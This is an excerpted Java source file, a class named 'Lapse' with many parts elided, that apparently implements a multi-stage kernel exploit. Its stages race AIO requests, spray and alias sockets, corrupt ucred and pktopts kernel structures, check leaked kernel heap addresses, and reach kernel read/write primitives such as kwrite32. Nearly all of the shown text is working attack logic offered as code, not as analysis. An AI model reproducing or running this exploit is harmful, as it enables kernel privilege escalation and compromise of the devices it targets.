...
public class Lapse {
    ...
    public static boolean performSetup() {
        ...
        try {
            ...
            for (int i = 0; i < NUM_WORKERS; i++) {
                int offset = i * 0x28;
                blockReqs.putInt(offset + 0x08, 1);
                blockReqs.putInt(offset + 0x20, blockFd);
            }
    ...
    public static int[] executeStage1() {
        ...
        try {
            ...
            for (int attempt = 1; attempt <= NUM_RACES; attempt++) {
                ...
                lingerBuf.putInt(0, 1);
                lingerBuf.putInt(4, 1);
        ...
        try {
            ...
            for (int i = 0x10; i <= 0x20; i += 8) {
                ...
                if (highWord != (short)0xffff) {
                    Status.println("verifyReqs2 failed: invalid highWord at offset " + i);
                    return false;
                }
            ...
            if (!(state1 > 0 && state1 <= 4) || state2 != 0) {
                Status.println("verifyReqs2 failed: invalid state, state1=" + state1 + ", state2=" + state2);
                return false;
            }
            long filePtr = buf.getLong(offset + 0x40);
            if (filePtr != 0) {
                Status.println("verifyReqs2 failed: filePtr not null, got=" + filePtr);
                return false;
            }
            for (int i = 0x48; i <= 0x50; i += 8) {
                ...
                if (highWord == (short)0xffff) {
                    ...
                    Status.println("verifyReqs2 failed: invalid kernel address at offset " + i);
                    return false;
                }
            }
            if (prefixCount < 2) {
                Status.println("verifyReqs2 failed: insufficient heap prefixes, count=" + prefixCount);
                return false;
            }
            int firstPrefix = heapPrefixes[0];
            for (int i = 1; i < prefixCount; i++) {
                if (heapPrefixes[i] != firstPrefix) {
                    Status.println("verifyReqs2 failed: inconsistent heap prefixes");
                    return false;
                }
            }
            return true;
    ...
    public static boolean executeStage2(int[] aliasedPair) {
        ...
        try {
            ...
            wbuf.putInt(reqs3Offset + 0, 1);
            wbuf.putInt(reqs3Offset + 4, 0);
            wbuf.putInt(reqs3Offset + 8, Helper.AIO_STATE_COMPLETE);
            wbuf.putByte(reqs3Offset + 0xc, (byte)0);
            wbuf.putInt(reqs3Offset + 0x28, 0x67b0000);
            wbuf.putLong(reqs3Offset + 0x38, 1L);
            
            int numElems = 6;
            long ucred = kbufAddr + 4;
            Buffer leakReqs = Helper.createAioRequests(numElems);
            leakReqs.putLong(0x10, ucred);
            int numLoop = NUM_SDS;
            ...
            for (int i = 1; i <= NUM_LEAKS; i++) {
                ...
                try {
                    ...
                    Status.println("Delay interrupted: " + e.getMessage());
                }
    ...
    public static int[] executeStage3(int aliasedSd) {
        ...
        reqs2.putInt(4, 5);
        reqs2.putLong(0x18, reqs1Addr);
        reqs2.putLong(0x20, fakeReqs3Addr);
    ...
    public static boolean executeStage4(int[] pktoptsSds, long k100Addr, long kernelAddr,
        ...
        for (int i = 1; i <= NUM_ALIAS; i++) {
            ...
            if (markersSet == 0) {
                Status.println("No valid sockets for setting markers in attempt: " + i);
                break;
            }
            try {
                Thread.sleep(100); // Added delay for timing stability
            } catch (InterruptedException e) {
                Status.println("Delay interrupted in Stage 4: " + e.getMessage());
            }
            Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
            int marker = tclass.getInt(0);
            Status.println("Attempt " + i + ": marker read = " + Integer.toHexString(marker));
            if ((marker & 0xffff) == 0x4141) {
                ...
                if (idx >= 0 && idx < sdsAlt.length) {
                    ...
                    Status.println("Invalid idx for reclaimSock: " + idx);
                }
            }
        }
        if (reclaimSock == -1) {
            Status.println("Failed to overwrite main pktopts: reclaimSock not found after " + NUM_ALIAS + " attempts");
            return false;
        }
        int pktinfoLen = 0x14;
        ...
        for (int i = 0; i < sockIncreaseRef.length; i++) {
            ...
            kernelRW.kwrite32(sockAddr + 0x0, 0x100);
        }
